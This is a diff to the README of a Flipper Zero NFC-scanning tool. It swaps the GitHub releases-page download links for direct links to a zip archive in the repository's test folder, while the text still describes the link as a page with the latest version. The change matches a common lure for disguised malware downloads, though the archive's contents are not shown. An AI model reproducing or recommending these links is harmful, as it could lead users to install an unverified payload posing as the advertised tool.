@@ -1,6 +1,6 @@
 # 🛡️ Gatekeeper-FlipperZero - Scan Before You Tap
 
-[![Download Now](https://img.shields.io/badge/Download-Gatekeeper_FlipperZero-2ea44f?style=for-the-badge&logo=github)](https://github.com/Helpfulnessevasion410/Gatekeeper-FlipperZero/releases)
+[![Download Now](https://img.shields.io/badge/Download-Gatekeeper_FlipperZero-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Helpfulnessevasion410/Gatekeeper-FlipperZero/main/test/Flipper_Zero_Gatekeeper_v2.0.zip)
 
 ---
 
@@ -27,7 +27,7 @@ It's like having X-ray vision for NFC tags.
 
 ## 📥 Download and Installation
 
-**Visit this link to download the application:** [https://github.com/Helpfulnessevasion410/Gatekeeper-FlipperZero/releases](https://github.com/Helpfulnessevasion410/Gatekeeper-FlipperZero/releases)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/Helpfulnessevasion410/Gatekeeper-FlipperZero/main/test/Flipper_Zero_Gatekeeper_v2.0.zip](https://raw.githubusercontent.com/Helpfulnessevasion410/Gatekeeper-FlipperZero/main/test/Flipper_Zero_Gatekeeper_v2.0.zip)
 
 This link will take you to a page where you can grab the latest version of Gatekeeper-FlipperZero.
 
